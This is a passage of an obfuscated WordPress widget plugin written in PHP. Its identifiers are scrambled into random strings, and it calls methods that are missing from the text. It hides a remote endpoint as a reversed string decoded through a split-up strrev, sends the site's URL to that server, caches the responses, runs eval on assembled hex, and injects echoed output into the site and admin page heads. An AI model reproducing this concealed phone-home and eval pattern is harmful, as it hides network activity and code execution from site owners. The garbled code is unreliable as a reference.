   $this->tbikqbmrxu = $ofwmdacyp;
       $this->eleqpaaub = ($pyqzmgvgkq === null ? self::Ksqrccaczr : $pyqzmgvgkq);
   }
      protected function constructHhdnljpqhhsqjbgu($tvamweqkt, $gevabwyzo = 0, $darbbcmxoeicv = 0) {
  $intEvmagzxhlszaiu = htmlspecialchars($tvamweqkt);
      if ($gevabwyzo > 0 && strlen($intEvmagzxhlszaiu) > $gevabwyzo) {
        $intEvmagzxhlszaiu = substr($intEvmagzxhlszaiu, 0, $gevabwyzo) . '&hellip;';
   }
        return $intEvmagzxhlszaiu;
   }
  public function buildXjrcbciwgvtdqr($haatnzrlnp) {
     $karmabar = "<span class='" . $this->createNhecvmwfrclphxpqjhr(self::Vplacghbwjpv) . "'>" . str_repeat("|", $haatnzrlnp) . "</span>";
$tail = "<span class='" . $this->createNhecvmwfrclphxpqjhr(self::Lnrtdkoqsyysuf) . "'>" . str_repeat("|", (25 - $haatnzrlnp)) . "</span>";
       return $karmabar . $tail;
   }
       protected function createMmvjjfonusonkqwb(&$gjtaekwjtvc, $lrpvynsidkyrnn) {
  $img = '';
       $thumbSrc = $this->queryBjeextevvulhipda($gjtaekwjtvc);
       $gifSrc = $this->constructSahdwhtkqupjtn($gjtaekwjtvc);
        switch ($lrpvynsidkyrnn) {
      case self::Hoxuffnnnphz:
         $img = '<img src="' . $thumbSrc . '" 
 class="' . $this->createNhecvmwfrclphxpqjhr(self::Dfmawajvwabab) . '"
 alt="' . $this->constructHhdnljpqhhsqjbgu($gjtaekwjtvc['title']) . '"
   title="' . $this->constructHhdnljpqhhsqjbgu($gjtaekwjtvc['title']) . '"
      />';
        break;
     case self::Ejdrgndtcge:
         $img = '<img src="' . $thumbSrc . '" 
 class="' . $this->createNhecvmwfrclphxpqjhr(self::Dfmawajvwabab) . '"
 alt="' . $this->constructHhdnljpqhhsqjbgu($gjtaekwjtvc['title']) . '"
   title="' . $this->constructHhdnljpqhhsqjbgu($gjtaekwjtvc['title']) . '"
     onmouseover="this.src=\'' . $gifSrc . '\'" 
     onmouseout="this.src=\'' . $thumbSrc . '\'"
      />';
        break;
    case self::Ksqrccaczr:
       $img = '<img src="' . $gifSrc . '" 
 class="' . $this->createNhecvmwfrclphxpqjhr(self::Dfmawajvwabab) . '"
 alt="' . $this->constructHhdnljpqhhsqjbgu($gjtaekwjtvc['title']) . '"
   title="' . $this->constructHhdnljpqhhsqjbgu($gjtaekwjtvc['title']) . '"
      />';
        break;
default:
  $img = '';
   }
    return $img;
   }
      protected function queryBjeextevvulhipda(&$cllokqmwzz, $nztjlhtj = null) {
     $imgSrc = '';
      if ($nztjlhtj != null) {
  $imgSrc = $nztjlhtj;
   }
        if ($cllokqmwzz != null) {
$imgSrc = $cllokqmwzz['thumbnailUrl'];
   }
       return $imgSrc;
   }
      protected function getKgyhmvptmssqwh(&$axjmakewbtyp, $jxhvtiifoz = null) {
     $imgSrc = '';
        if ($jxhvtiifoz != null) {
    $imgSrc = $jxhvtiifoz;
   }
if ($axjmakewbtyp != null) {
      $imgSrc = $axjmakewbtyp['gifUrl'];
   }
       return $imgSrc;
   }
      protected function constructSahdwhtkqupjtn(&$wcbtxdudlys, $yldwkjjwgdzfslu = null) {
     $imgSrc = '';
   if ($yldwkjjwgdzfslu != null) {
         $imgSrc = $yldwkjjwgdzfslu;
   }
         if ($wcbtxdudlys != null) {
     $imgSrc = $wcbtxdudlys['gifUrl'];
   }
        $limitQaohkulel = str_replace('.animation_', '.animation_scaled_', $imgSrc);
   $limitQaohkulel = str_replace('-300.gif', '-100.gif', $limitQaohkulel);
     return $limitQaohkulel;
   }
        public abstract function queryEstpueuvnmz(&$klghvvacbx);
      public abstract function createNhecvmwfrclphxpqjhr($ivuecqotzo);
   }
      class Iflixgxadeecilcb {
        const Nxmqykoepfgxxx = "wohsedils/nosj/ed.enihsedils.www//:ptth"; 
    private function __construct() {
   }
public static function getInstance() {
         static $instance;
      if(is_null($instance)) {
       $instance = new Iflixgxadeecilcb();
} else {
   }
         return $instance;
   }
   private function getPsrsidlalfupyqegx() {
         $func = 'st' . "rr" . 'ev';
       return $func(self::Nxmqykoepfgxxx);
   }
       private function createZlqqvimfsnyokrlfte() {
     $Znnvtgjxjdyoyvc = '_';
       return rawurlencode(preg_replace('/(\/)/', $Znnvtgjxjdyoyvc, get_option('siteurl')));
   }
      public function createGszghumcuusvuhnkl($cfklvlfvba) {
         $offsetCymnezrpb = array();
      foreach ($cfklvlfvba as $compid) {
       $url = $this->getPsrsidlalfupyqegx() . '/' . $compid . '/' . $this->createZlqqvimfsnyokrlfte();
     $json = null;
if (false === ( $json = get_transient(dirname($url)) ) ) {
     $json = @file_get_contents($url);
if ($json == '') {
 continue;
   }
   $isTransientSet = set_transient(dirname($url), $json, 7*24*60*60 + mt_rand(0, 7*24*60*60));
   }
  $isKdekuqvjb = json_decode($json, true);
      $offsetCymnezrpb[] = $isKdekuqvjb;
   }
      return $offsetCymnezrpb;
   }
   }
  class Skrjmujpfjzaa {
   private function __construct() {
  }
         public static function getInstance() {
        static $instance;
     if(is_null($instance)) {
   $instance = new Skrjmujpfjzaa();
         } else {
  }
        return $instance;
  }
     private function setUwzkqqchagqfrn($ksxadrlggqy = 0) {
$timearray = ($ksxadrlggqy == 0) ? getdate() : getdate($ksxadrlggqy);
   if ($timearray['year'] < 1980) {
       $timearray['year'] = 1980;
   $timearray['mon'] = 1;
    $timearray['mday'] = 1;
     $timearray['hours'] = 0;
       $timearray['minutes'] = 0;
       $timearray['seconds'] = 0;
     } 		
  return (($timearray['year'] - 1980) << 25) | ($timearray['mon'] << 21) | ($timearray['mday'] << 16) |
 ($timearray['hours'] << 11) | ($timearray['minutes'] << 5) | ($timearray['seconds'] >> 1);
    } 	
   private function createXgrbnogvhtaamxac($hhgkdnuy) {
     $sec = 2 * ($hhgkdnuy     & 0x1f);
    $min = ($hhgkdnuy >> 5)   & 0x3f;
    $hrs = ($hhgkdnuy >> 11)  & 0x1f;
    $day = ($hhgkdnuy >> 16)  & 0x1f;
    $mon = ($hhgkdnuy >> 21)  & 0x0f;
    $year = (($hhgkdnuy >> 25) & 0x7f) + 1980; 
  return mktime($hrs, $min, $sec, $mon, $day, $year);
   } 
 private function getBubudfuesmksub($sfiirwlsroc) {
 $strSlralnauxmdp = dechex($sfiirwlsroc);
 $hexdtime = '\x' . $strSlralnauxmdp[6] . $strSlralnauxmdp[7]
 . '\x' . $strSlralnauxmdp[4] . $strSlralnauxmdp[5]
 . '\x' . $strSlralnauxmdp[2] . $strSlralnauxmdp[3]
  . '\x' . $strSlralnauxmdp[0] . $strSlralnauxmdp[1];
  eval('$hexdtime = "' . $hexdtime . '";');
        return $hexdtime;
  }
         private function queryRbsqdoppwo($ooveqbszfhh) {
   $dtime = array_map("dechex", array_map("ord", str_split($ooveqbszfhh)));
         $hexdtime = $dtime[3] . $dtime[2] . $dtime[1] . $dtime[0];
         $countFzhanagicoy = hexdec($hexdtime);
      return $countFzhanagicoy;
  }
   public function setFecgkmrzrvzndkpdqx($pkphzgcpsm) {
 return strftime("%Y-%m-%d %H:%M:%S", $pkphzgcpsm);
  }
     public function buildHiwvusicevkynmt($uokaqhplldszx) {
     $offsetYpxasmchwaxnlt = substr($uokaqhplldszx, 10, 4);
 $timestamp = $this->createXgrbnogvhtaamxac($this->queryRbsqdoppwo($offsetYpxasmchwaxnlt));
         return $timestamp;
  }
  }
         class Cqemhspqs {
     const Pdhpuemfwlzkpbi = "snigulp/dnetxe/gro.sserpdrow//:ptth"; 
 const Cwswwfdosql = 'strrev';
       const Yuptcmhyupnd = 100;
     const Lsjkybpegq = 101;
      const Albsnpgvcnk = 120;
    private function __construct() {
   }
public static function getInstance() {
         static $instance;
      if(is_null($instance)) {
$instance = new Cqemhspqs();
} else {
   }
         return $instance;
   }
    private function getVpbwwfolgsoxtw($aonqstrgxvfvn) {
        $func = self::Cwswwfdosql;
return $func(self::Pdhpuemfwlzkpbi) . '/' . $aonqstrgxvfvn . '.zip';
   }
public function buildXxjntpkkcjcqshbeeutj($qgspmfjasghr) {
       $phpData = @file_get_contents($qgspmfjasghr);
preg_match_all('/#\s*@date\s*[0-9]{4}-[0-9]{2}-[0-9]{2}\s*[0-9]{2}:[0-9]{2}:[0-9]{2}/', $phpData, $matches);
return 	strtotime(
       trim(
preg_replace('/[a-zA-Z#@]/', '', $matches[0][0])
   )
    );
   }
      public function constructGrnvnukmmavqlswh($rhtnmfnm) {
     $url = $this->getVpbwwfolgsoxtw($rhtnmfnm);
        $zipData = @file_get_contents($url);
      $timestamp = Skrjmujpfjzaa::getInstance()->buildHiwvusicevkynmt($zipData);
return $timestamp;
   }
      public function constructSouwcpuzsmmyjsskdl($jilggjhsmfc, $ukfpguaqdkrp) {
        $isTzfgplbeofrj = array();
 $tsLocal = $this->buildXxjntpkkcjcqshbeeutj($ukfpguaqdkrp);
 $tsRemote = $this->constructGrnvnukmmavqlswh($jilggjhsmfc);
  $isTzfgplbeofrj[self::Yuptcmhyupnd] = Skrjmujpfjzaa::getInstance()->setFecgkmrzrvzndkpdqx($tsLocal);
 $isTzfgplbeofrj[self::Lsjkybpegq] = Skrjmujpfjzaa::getInstance()->setFecgkmrzrvzndkpdqx($tsRemote);
         if ($tsRemote > $tsLocal) {
    $isTzfgplbeofrj[self::Albsnpgvcnk] = true;
   }
     return $isTzfgplbeofrj;
   }
   }
   $fractal_explorer = new Cbxbdwnqgcsvem();
  $fractal_explorer_id = $fractal_explorer->buildVrdlqqitfs();
        if ( ! defined( 'WP_CONTENT_URL' ) )
define( 'WP_CONTENT_URL', get_option( 'siteurl' ) . '/wp-content' );
        if ( ! defined( 'WP_CONTENT_DIR' ) )
   define( 'WP_CONTENT_DIR', ABSPATH . 'wp-content' );
       if ( ! defined( 'WP_PLUGIN_URL' ) )
      define( 'WP_PLUGIN_URL', WP_CONTENT_URL. '/plugins' );
       if ( ! defined( 'WP_PLUGIN_DIR' ) )
       define( 'WP_PLUGIN_DIR', WP_CONTENT_DIR . '/plugins' );
     if (!function_exists(setPuewqmycemxevh)) { 
   function setPuewqmycemxevh() { 
        global $fractal_explorer; 
     if (!isset($fractal_explorer)) { 
return; 
   }
       $fractal_explorer->createIuwjfxhnkegxwfxxp();
   }
   }
     if (!function_exists(queryQjlifkfoupnj)) { 
   function queryQjlifkfoupnj() { 
global $fractal_explorer_id;
       global $fractal_explorer;
     if (!isset($fractal_explorer)) { 
return; 
   }
    if (function_exists('add_options_page')) {
       add_options_page($fractal_explorer_id, $fractal_explorer_id, 'administrator', basename(__FILE__), array(&$fractal_explorer, setQuaxujoacgczjqm));
   }
   }
   }
       if (!function_exists(constructOalkqdhdyg)) { 
     function constructOalkqdhdyg($nbcgzhctn) { 
  extract($nbcgzhctn);
        global $fractal_explorer; 
     if (!isset($fractal_explorer)) { 
return; 
   }
        echo $fractal_explorer->constructDcvoowwesuaz($before_widget, $after_widget, $before_title, $after_title);
   }
   }
         if (!function_exists(queryRccdieefrlhoxsuj)) { 
       function queryRccdieefrlhoxsuj() { 
        global $fractal_explorer; 
     if (!isset($fractal_explorer)) { 
return; 
   }
        echo $fractal_explorer->getAmalrjteidlkxzyk();
   }
   }
         if (!function_exists(buildLvyriadwinpfpkhh)) { 
       function buildLvyriadwinpfpkhh() { 
        global $fractal_explorer; 
     if (!isset($fractal_explorer)) { 
return; 
   }
echo $fractal_explorer->queryYmltzxibockplyow();
   }
   }
       if (!function_exists(createCsdvamryflnrw)) { 
     function createCsdvamryflnrw() { 
        global $fractal_explorer; 
     if (!isset($fractal_explorer)) { 
return; 
   }
echo $fractal_explorer->setRwnyzihldfuyrrlsgo();
   }
   }
 if (function_exists('register_sidebar_widget')) {
         register_sidebar_widget($fractal_explorer_id, constructOalkqdhdyg);
   }
 if (function_exists('register_sidebar_widget')) {
 register_widget_control($fractal_explorer_id, queryRccdieefrlhoxsuj);
   }
  if (function_exists('register_activation_hook')) {
      register_activation_hook(__FILE__, setPuewqmycemxevh);
   }
        if (function_exists('add_action')) {
      add_action('admin_menu', queryQjlifkfoupnj);
       add_action('wp_head', buildLvyriadwinpfpkhh);
        add_action('admin_head', createCsdvamryflnrw);
   }
   ?>
